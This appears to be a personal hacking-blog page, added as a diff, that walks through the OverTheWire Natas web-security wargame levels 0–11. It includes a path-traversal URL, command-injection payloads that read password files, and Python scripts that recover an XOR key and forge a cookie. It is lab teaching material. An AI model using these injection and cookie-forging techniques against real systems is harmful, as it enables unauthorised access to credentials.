@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>Natas Challange (Overthewire) - Walkthrough </h1>
+        </div>
+        <div class="notion-body">
+            <h2>Level 0</h2>
+            <ul>
+                <p>Inspect code, the password is there</p>
+            </ul>
+
+            <h2>Level 1</h2>
+            <ul>
+                <p>Right click disabled. I dont think so... just use firefox or F12</p>
+            </ul>
+
+            <h2>Level 2</h2>
+            <ul>
+                <p>Check "files" directory, users.txt is there...</p>
+            </ul>
+
+            <h2>Level 3</h2>
+            <ul>
+                <p>Not even google will find it this time?? I guess robots.txt??</p>
+                <p>We discovered the s3cr3t directory, inside this one </p>
+            </ul>
+
+            <h2>Level 4</h2>
+            <ul>
+                <p>Intercept request and change the refererer of the request providing the URL that server wants</p>
+            </ul>
+
+            <h2>Level 5</h2>
+            <ul>
+                <p>Intercept request and change the logged in parameter providing a 1</p>
+            </ul>
+
+            <h2>Level 6</h2>
+            <ul>
+                <p>View source code and lookfor  secret.inc</p>
+                <pre><code class="language-http">http://natas6.natas.labs.overthewire.org/includes/secret.inc</code></pre>
+            </ul>
+
+            <h2>Level 7</h2>
+            <ul>
+                <p>Php noob programmer </p>
+                <pre><code class="language-http">http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8</code></pre>
+            </ul>
+
+            <h2>Level 8</h2>
+            <ul>
+                <p>Look at the code and find the following line</p>
+                <pre><code class="language-php">return bin2hex(strrev(base64_encode($secret)));</code></pre>
+                <p>Attempt to decode the $secret</p>
+                <pre><code class="language-php">bin2hex decode = ==QcCtmMml1ViV3b
+Reverse string = b3ViV1lmMmtCcQ==
+Base64 decode = oubWYf2kBq</code></pre>
+            </ul>
+            
+            <h2>Level 9</h2>
+            <ul>
+                <p>Attempt to execute command injection </p>
+                <pre><code class="language-bash">; cat /etc/natas_webpass/natas10 #</code></pre>
+            </ul>
+
+            <h2>Level 10</h2>
+            <ul>
+                <p>Attempt inject the following code</p>
+                <pre><code class="language-bash">.* /etc/natas_webpass/natas11 #</code></pre>
+            </ul>
+
+            <h2>Level 11</h2>
+            <ul>
+                <p>Looking at the code we figure out that in order to get the cookie with the parameter showpassword:yes we need to perform the following process</p>
+                <ul>
+                    <li>Get the cookie and URL decode it</li>
+                    <li>Decrypt the resulting string using XOR with the provided key</li>
+                    <li>JSON decode the resulting string</li>
+                </ul>
+                <p>Using the following code we discover that the key (used to XOR cypher) may be <b>'eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe'</b></p>
+                <pre><code class="language-python">import base64
+
+# Tu cookie URL-decoded (sin %3D)
+cookie_b64 = "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg="
+
+# JSON que sabemos que debería contener descifrado
+known_json = b'{"showpassword":"no","bgcolor":"#ffffff"}'
+
+cookie_bytes = base64.b64decode(cookie_b64)
+
+print(f"Cookie bytes length: {len(cookie_bytes)}")
+print(f"Known JSON length: {len(known_json)}")
+
+def xor_bytes(a, b):
+    return bytes([x ^ y for x, y in zip(a, b)])
+
+key_candidate = xor_bytes(cookie_bytes[:len(known_json)], known_json)
+
+print("Clave XOR estimada (bytes):", key_candidate)
+print("Clave XOR estimada (ASCII):", key_candidate.decode('utf-8', errors='replace'))
+
+clave_php = b"&lt;censored&gt;"  # pon aquí la clave EXACTA que viste en el código PHP
+
+print("Clave PHP (ASCII):", clave_php.decode('utf-8', errors='replace'))
+
+if key_candidate.startswith(clave_php):
+    print("¡La clave estimada coincide con la clave PHP al inicio!")
+else:
+    print("La clave estimada NO coincide con la clave PHP.")</code></pre>
+            <p>With the following script we automate the described process</p>
+            <pre><code class="language-python">import base64
+
+# Clave XOR real (repetida)
+key = b"eDWo" * 11  # Ajusta para que tenga al menos la longitud del JSON
+
+# JSON con showpassword = yes
+json_data = b'{"showpassword":"yes","bgcolor":"#ffffff"}'
+
+# XOR función
+def xor_bytes(data, key):
+    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
+
+# Encriptar JSON
+encrypted = xor_bytes(json_data, key[:len(json_data)])
+
+# Base64 encode para cookie
+cookie_value = base64.b64encode(encrypted).decode()
+
+print("Nueva cookie para 'data':", cookie_value)
+</code></pre>
+<p>New cookie crafter: HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5</p>
+</ul>
+
+        </div>
+    </div>
+
+
+</body>
+</html>
